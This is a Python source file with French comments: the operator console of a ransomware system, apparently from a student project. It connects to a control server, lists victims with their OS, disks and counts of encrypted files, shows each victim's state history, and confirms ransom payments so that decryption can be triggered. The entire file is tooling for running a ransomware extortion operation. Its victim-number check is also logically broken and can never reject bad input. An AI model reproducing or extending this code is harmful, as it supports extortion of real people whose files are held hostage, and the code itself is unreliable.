from utile import network as net
from utile import message as mess

# Connexion au serveur
serv, gp = net.connect_to_serv()

#----------------------------------------------------------
def choix_victime(liste_victime):
    # Demande du numéro de la victime
    nb_victime = len(liste_victime)
    num_victime = int(input(f"\nEntrez le numéro de la victime (de 1 à {nb_victime}): "))

    # Vérification de l'input de l'utilisateur
    while 1 > num_victime > nb_victime:
        print(f"\nErreur: veuillez entrer un nombre entre 1 et {nb_victime}")
        num_victime = int(input(f"\nEntrez le numéro de la victime (entre 1 et {nb_victime}): "))

    return num_victime

def choix_action():
    """Cette fonction, lorsqu'elle est appelée, affiche un menu et demande à l'utilisateur d'entrer le choix
    correspondant. Elle retourne un entier entre 1 et 4 qui est le choix de la personne. """

    menu = "\nCONSOLE DE CONTRÔLE\n===================\n1) Liste des victimes du ransomware\n2) Historique des états " \
           "d'une victime\n3) Renseigner le payement de rançon d'une victime\n4) Quitter\nVotre choix: "
    choix = int(input(menu))

    # Vérifie que le choix entré est bien entre 1 et 4
    while choix > 4 or choix < 1:
        print("\n-----------------------------------------")
        print("Veuillez entrer un chiffre entre 1 et 4!")
        print("-----------------------------------------")
        choix = int(input(menu))

    return choix

def afficher_liste_victime(data_victimes):
    print("\nLISTING DES VICTIMES DU RANSOMWARE")
    print("----------------------------------")

    # Affichage de chaque victime avec un format 'form'
    form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:}"
    print(form.format("id", "hash", "type", "disques", "statut", "nb. de fichiers"))

    for value in data_victimes:
        # Vérifie l'état pour savoir si ca affichera des fichiers "chiffrés", "déchiffrés" ou rien
        if value['STATE'] == 'PENDING':
            form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:} fichiers chiffrés"
        elif value['STATE'] == 'PROTECTED':
            form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:} fichiers déchiffrés"
        else:
            form = "{0:5}{1:15}{2:12}{3:15}{4:11}-"
        # Variable qui contient le hash pour pouvoir le couper après
        hash = value['HASH']
        print(form.format(str(value['VICTIM']).zfill(4), hash[:14], value['OS'], value['DISKS'], value['STATE'],
                          str(value['NB_FILES'])))

def afficher_historique_victime(data_victimes):
    print("\nHISTORIQUE DES ETATS D'UNE VICTIME")
    print("___________________________________")

    form = "{0:20} - {1:14} - {2:20}"
    for value in data_victimes:
        # Vérifie l'état pour savoir si ca affichera des fichiers "chiffrés", "déchiffrés" ou rien
        if value['STATE'] == 'PENDING':
            form = "{0:20} - {1:14} - {2:} fichiers chiffrés"
        elif value['STATE'] == 'PROTECTED':
            form = "{0:20} - {1:14} - {2:} fichiers déchiffrés"
        else:
            form = "{0:20} - {1:14}"
        print(form.format(str(value['TIMESTAMP']), str(value['STATE']), str(value['NB_FILES'])))

def afficher_rancon_victime(data_victimes):
    # Demande le numéro de la victime pour qui la rançon a été payée
    num_victime = str(choix_victime(data_victimes))

    temp2 = True

    while temp2:
        for victime in data_victimes:

            if str(victime['VICTIM']) == num_victime:

                if victime['STATE'] == 'PENDING':

                    choix = str.upper(
                        input(f"Confirmez la demande de déchiffrement pour la victime {victime['VICTIM']} (O/N): "))
                    if choix == 'O':

                        # Envoie au serveur la requête de l'historique d'une victime
                        net.send_message(serv, mess.set_message('CHANGE_STATE', [victime['VICTIM'], 'DECRYPT']))

                        print("La demande est transmise !")
                        temp2 = False
                    else:
                        print("La demande ne sera pas transmise.")
                        temp2 = False
                else:
                    print(f"ERREUR : La victime {victime['VICTIM']} est en mode {victime['STATE']}!")
                    afficher_rancon_victime(data_victimes)
#----------------------------------------------------------

if __name__ == "__main__":

    # Variable qui s'occupera de vérifier si l'utilisateur à bien fait le choix 1 avant de pouvoir faire tous les autres
    ordre_choix = False
    # Affiche une première fois le menu et stocke le choix
    num_choix = choix_action()
    # Création des listes qui seront remplies
    liste_victime = []
    historique_victime = []
    # Création d'une liste vide qui contiendra la liste des victimes et d'une variable temp pour pouvoir boucler sur
    # la boucle while d'en dessous
    temp = True

    # Boucle tant que l'utilisateur ne choisi pas le quatrième choix (quitter)
    while num_choix != 4:

        # Premier choix:
        if num_choix == 1:

            # On change la valeur de la variable puisque l'utilisateur a fait le premier choix
            ordre_choix = True
            # Envoie au serveur la requête de liste des victimes
            net.send_message(serv, mess.set_message('LIST_VICTIMS_REQ'))

            # Boucle qui ajoute les victimes dans la liste "liste_victimes"
            while temp:
                ligne_victime = net.receive_message(serv)
                if mess.get_message_type(ligne_victime) == 'LIST_VICTIM_RESP':
                    liste_victime.append(ligne_victime)
                    continue
                elif mess.get_message_type(ligne_victime) == 'LIST_VICTIM_END':
                    temp = False

            # Affiche les victimes à l'aide de la fonction afficher_liste_victime()
            afficher_liste_victime(liste_victime)

        # Deuxième choix, ne s'affiche QUE si l'utilisateur a déjà fait le choix 1 avant, sinon affiche une erreur:
        elif num_choix == 2:

            if ordre_choix:
                # Demande le numéro de la victime (qui est également l'ID de la victime)
                num_victime = choix_victime(liste_victime)
                # Ajoute l'id de la victime dans une liste car la fonction mess.set_message vérifie la taille de l'id
                # à 1 (donc 1 élément d'une liste)
                id_victime = [num_victime]

                # Envoie au serveur la requête de l'historique d'une victime
                net.send_message(serv, mess.set_message('HISTORY_REQ', id_victime))
                # Je réinitialise la variable temp au cas où elle serait toujours False du choix précédent
                temp = True

                while temp:
                    ligne_historique = net.receive_message(serv)
                    if mess.get_message_type(ligne_historique) == 'HISTORY_RESP':
                        historique_victime.append(ligne_historique)
                        continue
                    elif mess.get_message_type(ligne_historique) == 'HISTORY_END':
                        temp = False

                afficher_historique_victime(historique_victime)

            else:
                print("\nERREUR : Veuillez d'abord lister les victimes!\n")

        # Troisième choix, ne s'affiche QUE si l'utilisateur a déjà fait le choix 1 avant, sinon affiche une erreur:
        elif num_choix == 3:

            if ordre_choix:

                print("\nVALIDER LE PAIEMENT DE RANCON D'UNE VICTIME")
                print("____________________________________________")

                afficher_rancon_victime(liste_victime)

            else:
                print("\nERREUR: Veuillez d'abord lister les victimes!\n")
        # Redemande l'action pour savoir si on doit quitter la boucle et quitter ou s'il faut faire autre chose
        num_choix = choix_action()

    # Ferme la fenêtre lorsque le choix est 4
    print("Fermeture de la session.")
    exit()
